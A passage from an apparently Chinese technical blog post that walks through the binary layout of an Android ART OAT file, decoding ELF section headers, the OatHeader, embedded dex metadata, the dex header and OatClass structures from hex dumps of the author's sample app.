plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">25 00 00 00 06 00 00 00 02 00 00 00 00 50 48 00   </span><br><span class="line">00 50 48 00 38 00 00 00 01 00 00 00 00 00 00 00   </span><br><span class="line">00 10 00 00 08 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：25 00 00 00<br>section类型：06 00 00 00    //Information for dynamic linking<br>section标记：02 00 00 00<br>section虚拟地址：00 50 48 00<br>section文件偏移：00 50 48 00    //0x485000<br>section大小：38 00 00 00        //0x38 推出结束偏移：0x485038<br>section到section头表的链接：01 00 00 00<br>section额外信息：00 00 00 00<br>section对齐：00 10 00 00<br>section入口表大小：08 00 00 00    </p><p>第八个section头：(.shstrtab)：<br>由ELF文件头知：shstrtab在section头表总的下标为0x07,在本案例中即最后一个section<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">2E 00 00 00 03 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 38 50 48 00 38 00 00 00   </span><br><span class="line">00 00 00 00 00 00 00 00 01 00 00 00 01 00 00 00</span><br></pre></td></tr></table></figure></p><p>section名称：2E 00 00 00<br>section类型：03 00 00 00    //字符串表（段表字符串表）<br>section标记：00 00 00 00<br>section虚拟地址：00 00 00 00<br>section文件偏移：38 50 48 00    //0x485038<br>section大小：38 00 00 00        //0x38 推出结束偏移：0x485070<br>section到section头表的链接：00 00 00 00<br>section额外信息：00 00 00 00<br>section对齐：01 00 00 00<br>section入口表大小：01 00 00 00    </p><p>依据section头信息，导出.shstrtab内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">00 2E 64 79 6E 73 79 6D 00 2E 64 79 6E 73 74 72   </span><br><span class="line">00 2E 68 61 73 68 00 2E 72 6F 64 61 74 61 00 2E   </span><br><span class="line">74 65 78 74 00 2E 64 79 6E 61 6D 69 63 00 2E 73   </span><br><span class="line">68 73 74 72 74 61 62 00</span><br></pre></td></tr></table></figure></p><p>对应的字符信息：<br>索引 | 值<br>— | —<br>0x0|\00<br>0x01|.dynsym\00<br>0x09|.dynstr\00<br>0x11|.hash\00<br>0x17|.rodata\00<br>0x1f|.text\00<br>0x25|.dynamic\00<br>0x2e|.shstrtab\00</p><hr><h2 id="oat文件头"><a href="#oat文件头" class="headerlink" title="oat文件头"></a>oat文件头</h2><p>oat文件头结构：/art/runtime/oat.h<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><span class="line">class PACKED(4) OatHeader &#123;</span><br><span class="line">    ...</span><br><span class="line"> private:</span><br><span class="line">  ...</span><br><span class="line">  uint8_t magic_[4];    //魔数‘oat\n’</span><br><span class="line">  uint8_t version_[4];  //oat文件版本号</span><br><span class="line">  uint32_t adler32_checksum_;   //校验和</span><br><span class="line"></span><br><span class="line">  InstructionSet instruction_set_;  //本地机器指令集，表示指令的类型（枚举类型）/art/runtime/instruction_set.h</span><br><span class="line">  InstructionSetFeatures instruction_set_features_; //架构特性</span><br><span class="line">  uint32_t dex_file_count_; //oat文件包含的dex文件个数</span><br><span class="line">  uint32_t executable_offset_;  //oatexec段开始位置与oatdata段开始位置的偏移值（oatexec段开始位置+executable_offset_=oatdata段开始位置）</span><br><span class="line"></span><br><span class="line">  uint32_t interpreter_to_interpreter_bridge_offset_;   //用来从解释器调用另外一个也是通过解释器来执行的类方法的trampoline代码的偏移位置</span><br><span class="line">  uint32_t interpreter_to_compiled_code_bridge_offset_; //用来从解释器调用另外一个通过本地机器指令执行的类方法的trampoline代码的偏移位置</span><br><span class="line">  uint32_t jni_dlsym_lookup_offset_;    //类方法在执行过程中，若被调用的方法是JNI函数，那么通过存放在此位置的trampoline代码来调用</span><br><span class="line">  uint32_t portable_imt_conflict_trampoline_offset_;    //...</span><br><span class="line">  uint32_t portable_resolution_trampoline_offset_;  //用来在运行时解析还未链接的类方法的trampoline代码位置（portable类型的机器指令）</span><br><span class="line">  uint32_t portable_to_interpreter_bridge_offset_;  //用来从本地机器指令（portable类型）调用另外一个通过解释器解释执行的类方法的trampoline代码的偏移位置</span><br><span class="line">  uint32_t quick_generic_jni_trampoline_offset_;    //...</span><br><span class="line">  uint32_t quick_imt_conflict_trampoline_offset_;   //...</span><br><span class="line">  uint32_t quick_resolution_trampoline_offset_; //用来在运行时解析还未链接的类方法的trampoline代码位置（quick类型的机器指令）</span><br><span class="line">  uint32_t quick_to_interpreter_bridge_offset_;  //用来从本地机器指令（quick类型）调用另外一个通过解释器解释执行的类方法的trampoline代码的偏移位置</span><br><span class="line"></span><br><span class="line">  //由于每一个应用程序都会依赖于boot.art文件，上述10个变量指向的trampoline代码段只存在于boot.art文件中，即在应用程序classes.dex生成的oat文件的oatdata段头部，上述变量值均为0</span><br><span class="line"></span><br><span class="line">  // The amount that the image this oat is associated with has been patched.</span><br><span class="line">  int32_t image_patch_delta_;   //该oat文件关联的image被patch的数量</span><br><span class="line"></span><br><span class="line">  uint32_t image_file_location_oat_checksum_;   //用来创建image空间的oat文件的校验和</span><br><span class="line">  uint32_t image_file_location_oat_data_begin_; //用来创建image空间的oat文件的oatdata段在内存的位置</span><br><span class="line"></span><br><span class="line">  uint32_t key_value_store_size_;   //用来创建image空间的文件路径的大小</span><br><span class="line">  uint8_t key_value_store_[0];  // note variable width data at end</span><br><span class="line"></span><br><span class="line">  DISALLOW_COPY_AND_ASSIGN(OatHeader);</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">// InstructionSet</span><br><span class="line">enum InstructionSet &#123;</span><br><span class="line">  kNone,</span><br><span class="line">  kArm,</span><br><span class="line">  kArm64,</span><br><span class="line">  kThumb2,</span><br><span class="line">  kX86,</span><br><span class="line">  kX86_64,</span><br><span class="line">  kMips,</span><br><span class="line">  kMips64</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>案例分析④：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a></p><p>开始位置：0x1000<br>由rodata.txt中的数据及oat文件头结构知：<br>魔数：6F 61 74 0A   //大端序，0x6f61740a<br>版本号：30 33 39 00 //大端序，0x30333900<br>校验和：E4 E3 11 75<br>指令类型：03 00 00 00<br>指令集特性：01 00 00 00<br>包含的dex文件个数：01 00 00 00<br>oatexec段开始位置相对于oatdata段开始位置的偏移：00 00 2A 00<br>解释器执行到解释器执行的trampoline代码的偏移位置：00 00 00 00<br>解释器执行到本地机器指令执行的trampoline代码的偏移位置：00 00 00 00<br>JNI方法调用的trampoline代码的偏移位置：00 00 00 00<br>portable_imt_conflict_trampoline_offset_：00 00 00 00<br>本地机器指令（portable）执行解析未链接的方法的trampoline代码的偏移位置：00 00 00 00<br>本地机器指令（portable）执行到解释器执行的trampoline代码的偏移位置：00 00 00 00<br>quick_generic_jni_trampoline_offset_：00 00 00 00<br>quick_imt_conflict_trampoline_offset_：00 00 00 00<br>本地机器指令（quick）执行解析未链接的方法的trampoline代码的偏移位置：00 00 00 00<br>本地机器指令（quick）执行到解释器执行的trampoline代码的偏移位置：00 00 00 00<br>image_patch_delta_：00 00 00 00<br>创建image空间的oat文件的校验和：8E 72 EE 60<br>创建image空间的oat文件的oatdata段在内存的位置：00 F0 17 71<br>key_value_store_size_：A6 01 00 00<br>key_value_store_：(dex2oat的参数)   </p><p>依据key_value_store_size_导出key_value_store_的内容：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line">64 65 78 32 6F 61 74 2D 63 6D 64 6C 69 6E 65 00   </span><br><span class="line">2D 2D 7A 69 70 2D 66 64 3D 36 20 2D 2D 7A 69 70   </span><br><span class="line">2D 6C 6F 63 61 74 69 6F 6E 3D 2F 64 61 74 61 2F   </span><br><span class="line">61 70 70 2F 63 6F 6D 2E 65 78 61 6D 70 6C 65 2E   </span><br><span class="line">70 61 73 73 65 72 62 79 2E 6D 79 61 70 70 6C 69   </span><br><span class="line">63 61 74 69 6F 6E 2E 61 70 70 2D 31 2F 62 61 73   </span><br><span class="line">65 2E 61 70 6B 20 2D 2D 6F 61 74 2D 66 64 3D 37   </span><br><span class="line">20 2D 2D 6F 61 74 2D 6C 6F 63 61 74 69 6F 6E 3D   </span><br><span class="line">2F 64 61 74 61 2F 64 61 6C 76 69 6B 2D 63 61 63   </span><br><span class="line">68 65 2F 61 72 6D 2F 64 61 74 61 40 61 70 70 40   </span><br><span class="line">63 6F 6D 2E 65 78 61 6D 70 6C 65 2E 70 61 73 73   </span><br><span class="line">65 72 62 79 2E 6D 79 61 70 70 6C 69 63 61 74 69   </span><br><span class="line">6F 6E 2E 61 70 70 2D 31 40 62 61 73 65 2E 61 70   </span><br><span class="line">6B 40 63 6C 61 73 73 65 73 2E 64 65 78 20 2D 2D   </span><br><span class="line">69 6E 73 74 72 75 63 74 69 6F 6E 2D 73 65 74 3D   </span><br><span class="line">61 72 6D 20 2D 2D 69 6E 73 74 72 75 63 74 69 6F   </span><br><span class="line">6E 2D 73 65 74 2D 66 65 61 74 75 72 65 73 3D 64   </span><br><span class="line">69 76 20 2D 2D 72 75 6E 74 69 6D 65 2D 61 72 67   </span><br><span class="line">20 2D 58 6D 73 36 34 6D 20 2D 2D 72 75 6E 74 69   </span><br><span class="line">6D 65 2D 61 72 67 20 2D 58 6D 78 35 31 32 6D 00   </span><br><span class="line">64 65 78 32 6F 61 74 2D 68 6F 73 74 00 41 72 6D   </span><br><span class="line">00 69 6D 61 67 65 2D 6C 6F 63 61 74 69 6F 6E 00   </span><br><span class="line">2F 64 61 74 61 2F 64 61 6C 76 69 6B 2D 63 61 63   </span><br><span class="line">68 65 2F 61 72 6D 2F 73 79 73 74 65 6D 40 66 72   </span><br><span class="line">61 6D 65 77 6F 72 6B 40 62 6F 6F 74 2E 61 72 74   </span><br><span class="line">00 78 70 6F 73 65 64 2D 6F 61 74 2D 76 65 72 73   </span><br><span class="line">69 6F 6E 00 32 00</span><br></pre></td></tr></table></figure></p><p>对应的字符信息：</p><p>dex2oat-cmdline\00<br>–zip-fd=6    –zip-location=/data/app/com.example.passerby.myapplication.app-1/base.apk –oat-fd=7     --oat-location=/data/dalvik-cache/arm/data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a> –instruction-set=arm –instruction-set-features=div –runtime-arg -Xms64m –runtime-arg -Xmx512m\00<br>dex2oat-host\00<br>Arm\00<br>image-location\00<br>/data/dalvik-cache/arm/system@<a href="mailto:framework@boot.art" target="_blank" rel="noopener">framework@boot.art</a>\00<br>xposed-oat-version\00<br>2\    </p><p>OatHeader后就是Dex文件相关信息(开始位置:0x11FA):<br>根据OatHeader中dex_file_count_的值可知，此处共包含1个Dex文件的内容。<br>若用DexMetaData结构表示Dex文件的内容，其包含的字段如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">uint32_t dex_file_location_size;     //dex文件路径的字节数(4字节)    </span><br><span class="line">char* dex_file_location_data;        //dex文件的路径    </span><br><span class="line">uint32_t dex_file_checksum;          //dex文件的校验和(4字节)    </span><br><span class="line">uint32_t dex_file_offset;            //dex文件相对于oatdata段开始地址的偏移(4字节)   </span><br><span class="line">const uint32_t* methods_offsets_pointer;//是一个数组，元素共有class_defs_size（dex中类的数目）个，该数组的索引与dex中类的索引是一致的，</span><br><span class="line">                                        即第0个类对应methods_offsets_pointer[0],元素的值是相对于oatdata段开始地址的偏移，</span><br><span class="line">                                        比如dex中第0个类对应的OatClass在文件中的开始地址=methods_offsets_pointer[0]+oatdata段开始地址。</span><br></pre></td></tr></table></figure></p><p>所以，整个DexMetaData的字节数=OatHeader-&gt;dex_file_count_ <em> (4+dex_file_location_data+4+4+4</em>dex-&gt;class_defs_size)<br>                          = OatHeader-&gt;dex_file_count_ <em> (12+ dex_file_location_data + 4 </em> dex-&gt;class_defs_size)</p><p>案例分析⑤：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a></p><p>根据OatHeader的结束位置导出Dex文件信息(0x11FA)：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">3B 00 00 00 2F 64   </span><br><span class="line">61 74 61 2F 61 70 70 2F 63 6F 6D 2E 65 78 61 6D   </span><br><span class="line">70 6C 65 2E 70 61 73 73 65 72 62 79 2E 6D 79 61   </span><br><span class="line">70 70 6C 69 63 61 74 69 6F 6E 2E 61 70 70 2D 31   </span><br><span class="line">2F 62 61 73 65 2E 61 70 6B 7C 2B D8 F3 7C 18 00   </span><br><span class="line">00 4C 23 22 00 58 23 22 00 6C 23 22 00 80 23 22   </span><br><span class="line">00 9C 23 22 00 A0 23 22 00 D4 23 22 00 D8 23 22   </span><br><span class="line">00 4C 24 22 00 50 24 22 00 6C 24 22 00 90 24 22   </span><br><span class="line">00 CC 24 22 00 E0 24 22 00 F4 24 22 00 40 25 22   </span><br><span class="line">00 44 25 22 00 48 25 22 00 6C 25 22 00 98 25 22   </span><br><span class="line">....</span><br></pre></td></tr></table></figure></p><p>dex文件路径的字节数：3B 00 00 00  //0x3B = 3*16+11个字节<br>dex文件路径：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">2F 64 61 74 61 2F 61 70 70 2F 63 6F 6D 2E 65 78     </span><br><span class="line">61 6D 70 6C 65 2E 70 61 73 73 65 72 62 79 2E 6D     </span><br><span class="line">79 61 70 70 6C 69 63 61 74 69 6F 6E 2E 61 70 70     </span><br><span class="line">2D 31 2F 62 61 73 65 2E 61 70 6B</span><br></pre></td></tr></table></figure></p><p>对应的字符信息：    /data/app/com.example.passerby.myapplication.app-1/base.apk<br>dex文件校验和：7C 2B D8 F3<br>dex文件相对于oatdata段开始地址的偏移：7C 18 00 00   //0x187c  相对于oat文件的偏移：0x1000 + 0x187c = 0x287c   </p><p>methods_offsets_pointer:（每项4个字节，共class_defs_size项，即1422项，结束位置：0x1241+1422*4 = 0x2879）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">4C 23 22 00 58 23 22 00 6C 23 22 00 80 23 22 00     </span><br><span class="line">9C 23 22 00 A0 23 22 00 D4 23 22 00 D8 23 22 00     </span><br><span class="line">4C 24 22 00 50 24 22 00 6C 24 22 00 90 24 22 00     </span><br><span class="line">CC 24 22 00 E0 24 22 00 F4 24 22 00 40 25 22 00     </span><br><span class="line">44 25 22 00 48 25 22 00 6C 25 22 00 98 25 22 </span><br><span class="line">...</span><br><span class="line">00 C0 7D 23 00 C4 7E 23 00 00</span><br></pre></td></tr></table></figure></p><h2 id="dex文件头"><a href="#dex文件头" class="headerlink" title="dex文件头"></a>dex文件头</h2><p>根据dex文件地址(0x287c-0x2A1000)导出数据：<br>64 65 78 0A 30 33 35 00 39 DD DD F3 29 80 26 28<br>9E D5 51 3F A1 2B 09 1A 7D D4 6F F8 80 20 96 4C<br>D0 0A 22 00 70 00 00 00 78 56 34 12 00 00 00 00<br>00 00 00 00 F4 09 22 00 19 53 00 00 70 00 00 00<br>87 08 00 00 D4 4C 01 00 51 0D 00 00 F0 6E 01 00<br>B0 3A 00 00 BC 0E 02 00 DF 3E 00 00 3C E4 03 00<br>8E 05 00 00 34 DB 05 00 DC 7D 1B 00 F4 8C 06 00<br>…</p><p>可以看到dex文件的文件头：<br>魔数：64 65 78 0A 30 33 35 00  //对应的字符信息dex.035<br>dex文件校验和：39 DD DD F3<br>dex文件sha1签名：29 80 26 28 9E D5 51 3F A1 2B 09 1A 7D D4 6F F8 80 20 96 4C<br>dex文件大小：D0 0A 22 00        //0x220AD0 推出文件结束地址： 0x287c + 0x220ad0 = 0x22334c<br>文件头大小：70 00 00 00         //0x70<br>字节序：78 56 34 12            //0x12345678 小端序<br>link_size_:00 00 00 00<br>link_off_:00 00 00 00<br>map_off_:F4 09 22 00<br>string_ids_size_:19 53 00 00<br>string_ids_off_:70 00 00 00<br>type_ids_size_:87 08 00 00<br>type_ids_off_:D4 4C 01 00<br>proto_ids_size_:51 0D 00 00<br>proto_ids_off_:F0 6E 01 00<br>field_ids_size_:B0 3A 00 00<br>fields_ids_off_:BC 0E 02 00<br>method_ids_size_:DF 3E 00 00<br>methods_ids_off_:3C E4 03 00<br>class_defs_size_:8E 05 00 00    //0x058E,1422,dex文件中共包含1422个类定义<br>class_defs_off_:34 DB 05 00     //0x05db34,相对于dex文件头的偏移位置，相对于oat文件的偏移：0x05db34+0x287c=0x0603b0<br>data_size_:DC 7D 1B 00<br>data_off_:F4 8C 06 00   </p><h2 id="dex类分析"><a href="#dex类分析" class="headerlink" title="dex类分析"></a>dex类分析</h2><p>案例分析⑥：data@<a href="mailto:app@com.example.passerby.myapplication.app-1" target="_blank" rel="noopener">app@com.example.passerby.myapplication.app-1</a>@<a href="mailto:base.apk@classes.dex" target="_blank" rel="noopener">base.apk@classes.dex</a>   </p><p>使用dextra工具导出该oat文件中的dex或手动选中dex文件地址范围保存：（采用export的方式导出010的dex模板会识别不了，应该是导 出的格式有问题;下面所说的偏移都是相对于导出dex文件的偏移）<br>在010工具的type_ids中查找MainActivity，找到对应的索引号1925，转为16进制即：85 07 00 00 ，在010中全局搜索’85 07 00 00‘，找到MainActivity类定义偏移0x68cd4。<br>借助dex分析模板，找到mainActivity类定义的偏移位置：0x068cd4,由DexClassDef结构知，每个DexClassDef大小为32个字节<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">85 07 00 00 01 00 00 00 14 05 00 00 00 00 00 00   </span><br><span class="line">3E 16 00 00 00 00 00 00 5A 9C 20 00 00 00 00 00</span><br></pre></td></tr></table></figure></p><p>类类型：85 07 00 00     //0x0785，指向type_ids的索引<br>访问标志：01 00 00 00   //0x1，public<br>父类类型：14 05 00 00   //0x0514，指向type_ids的索引<br>接口偏移：00 00 00 00   //0x0，指向type_ids的索引，class不为interface,此项值为0<br>源文件名：3E 16 00 00   //0x163e，指向string_ids的索引,string_ids[5094]，MainActivity.java<br>注解偏移：00 00 00 00   //0x0，指向DexAnnotationsDirectoryItem结构，若无此项内容，该值为0<br>类数据偏移：5A 9C 20 00 //0x209c5a，指向DexClassData结构的偏移<br>类静态数据偏移：00 00 00 00 //0x0，指向DexEncodedArray结构的偏移    </p><p>查看类数据：（0x209c5a）<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">00 02 01 02 8D 67 00 01 00 9B 79 81 80 04 8C E8   </span><br><span class="line">4B 9C 79 01 A4 E8 4B 02 04 80 E9 4B 03 04 00 04   </span><br><span class="line">01 04 02 02 04 02 04 01 02 1E 04 FF 01 37 6C 21   </span><br><span class="line">01 37 6D 21 04 04 05 04 03 04 02 04 04 0C 64 27   </span><br><span class="line">00 02 7F 64 7A 00 02 7F 64 7C 00 02 7F 64 7D 00   </span><br><span class="line">02 7F 64 7E 00 02 7F 64 7F 00 02 7F 64 80 00 02   </span><br><span class="line">7F 64 81 00 02 7F 64 82 00 02 7F 64 83 00 02 7F   </span><br><span class="line">64 84 00 02 7F 64     </span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>classDataHeader:<br>静态字段个数：0<br>实例字段个数：2<br>非虚方法：1<br>虚方法：2</p><p>字段：…</p><p>非虚方法：…</p><p>虚方法：…</p><h2 id="oat类分析"><a href="#oat类分析" class="headerlink" title="oat类分析"></a>oat类分析</h2><p>由该MainActivity类定义的偏移位置和class_defs_off偏移位置知：<br>(0x68cd4-0x5db34)/32=1421,即MainActivity是dex文件中第1422个类定义，在类定义列表中的下标为1421<br>对应methods_offsets_pointer[1421]</p><p>methods_offsets_pointer[1421]:C4 7E 23 00   //0X237EC4,该类对应的OatClass相对于oatdata的偏移<br>推出MainActivity对应的OatClass在文件中的偏移：0x237ec4+0x1000 = 0x238ec4   </p><p>MainActivity对应的OatClass:(一个direct方法，一个virtual方法)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">08 00 00 00 B9 31 48 00 E0 7E 23 00 11 32 48 00    </span><br><span class="line">EF 5A 27 00 61 33 48 00 23 5B 27 00 09 00 03 00   </span><br><span class="line">28 01 3A 00 08 01 09 00 05 00 36 07 2C 07 48 00   </span><br><span class="line">08 06 24 06 09 00 06 00 62 00 34 06 08 06 24 06   </span><br><span class="line">3E 06 5A 06 09 00 03 00 5A 00 2C 07 08 07 09 00   </span><br><span class="line">0A 00 82 7A 9E 7A BC 00 C4 00 D6 00 CE 62 94 7A   </span><br><span class="line">72 6A 08 60 78 7A 00 00 00 00 09 00   </span><br><span class="line">...</span><br></pre></td></tr></table></figure></p><p>//TODO<br>status:08 00  //kStatusVerified<br>type:00 00    //kOatClassAllCompiled(没有bitmap结构)<br>OatMethodOffSets[0]:B9 31 48 00 E0 7E 23 00<br>OatMethodOffSets[1]:11 32 48 00 EF 5A 27 00<br>…</p><p>OatClass结构分析：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line">//art/runtime/oat_file.h</span><br><span class="line">class OatClass &#123;</span><br><span class="line">    ...</span><br><span class="line">    private:</span><br><span class="line">    OatClass(</span><br><span class="line">        const OatFile* oat_file,</span><br><span class="line">        mirror::Class::Status status,</span><br><span class="line">        OatClassType type,</span><br><span class="line">        uint32_t bitmap_size,</span><br><span class="line">        const uint32_t* bitmap_pointer,</span><br><span class="line">        const OatMethodOffsets* methods_pointer</span><br><span class="line">    );</span><br><span class="line">    const OatFile*  oat_file_;</span><br><span class="line">    mirror::Class:Status status_;    //2 bytes</span><br><span class="line">    OatClassType type_;  //2 byes</span><br><span class="line">    const uint32_t* bitmap_;</span><br><span class="line">    const OatMethodOffsets* methods_pointer_;//方法的偏移数组，指向相应的native code，4bytes，OatMethodOffset的个数是该类被编译为native code的个数</span><br><span class="line">    friend class OatDexFile;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">// art/runtime/mirror/class.h</span><br><span class="line"> enum Status &#123;</span><br><span class="line">    kStatusRetired = -2,</span><br><span class="line">    kStatusError = -1,</span><br><span class="line">    kStatusNotReady = 0,</span><br><span class="line">    kStatusIdx = 1,  // Loaded, DEX idx in super_class_type_idx_ and interfaces_type_idx_.</span><br><span class="line">    kStatusLoaded = 2,  // DEX idx values resolved.</span><br><span class="line">    kStatusResolving = 3,  // Just cloned from temporary class object.</span><br><span class="line">    kStatusResolved = 4,  // Part of linking.</span><br><span class="line">    kStatusVerifying = 5,  // In the process of being verified.</span><br><span class="line">    kStatusRetryVerificationAtRuntime = 6,  // Compile time verification failed, retry at runtime.</span><br><span class="line">    kStatusVerifyingAtRuntime = 7,  // Retrying verification at runtime.</span><br><span class="line">    kStatusVerified = 8,  // Logically part of linking; done pre-init.</span><br><span class="line">    kStatusInitializing = 9,  // Class init in progress.</span><br><span class="line">    kStatusInitialized = 10,  // Ready to go.</span><br><span class="line">    kStatusMax = 11,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">// art/runtime/oat.h （OatClass类型不一样，methods_pointer_数组中的偏移位置的计算方式不一样）</span><br><span class="line">enum OatClassType &#123;</span><br><span class="line">  kOatClassAllCompiled = 0,   // OatClass is followed by an OatMethodOffsets for each method.</span><br><span class="line">  kOatClassSomeCompiled = 1,  // A bitmap of which OatMethodOffsets are present follows the OatClass.</span><br><span class="line">  kOatClassNoneCompiled = 2,  // All methods are interpretted so no OatMethodOffsets are necessary.</span><br><span class="line">  kOatClassMax = 3,</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">// art/runtime/oat.h</span><br><span class="line">class PACKED(4) OatMethodOffsets &#123;</span><br><span class="line"> public:</span><br><span class="line">  OatMethodOffsets();</span><br><span class="line"></span><br><span class="line">  OatMethodOffsets(uint32_t code_offset,</span><br><span class="line">                   uint32_t gc_map_offset);</span><br><span class="line"></span><br><span class="line">  ~OatMethodOffsets();</span><br><span class="line"></span><br><span class="line">  uint32_t code_offset_;//native code相对于oatdata段的偏移</span><br><span class="line">  uint32_t gc_map_offset_;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure><p>// OatMethodOffsets 计算方法<br>//函数参数method_idx是方法在dex表示的类中的偏移，比如类的第0个方法method_index为0，第一个方法为method_index为1，依次类推。<br>由于在OatClass中没有保存类中方法的数目，因而没有检查method_index的边界。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span 